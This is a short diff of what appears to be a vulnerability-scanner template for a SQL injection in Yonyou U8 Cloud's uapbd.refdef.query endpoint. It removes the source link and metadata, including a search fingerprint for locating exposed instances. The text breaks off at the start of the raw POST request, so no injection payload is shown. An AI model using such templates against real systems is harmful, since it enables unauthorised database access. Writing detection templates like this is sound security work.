@@ -3,12 +3,8 @@ info:
   name: 用友U8 Cloud uapbd.refdef.query SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gwd97aqix44ngbem'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gwd97aqix44ngbem
-    fofa: title=="U8C"
 http:
 - raw:
   - 'POST /u8cloud/openapi/uapbd.refdef.query?appcode=huo&isEncrypt=N HTTP/1.1
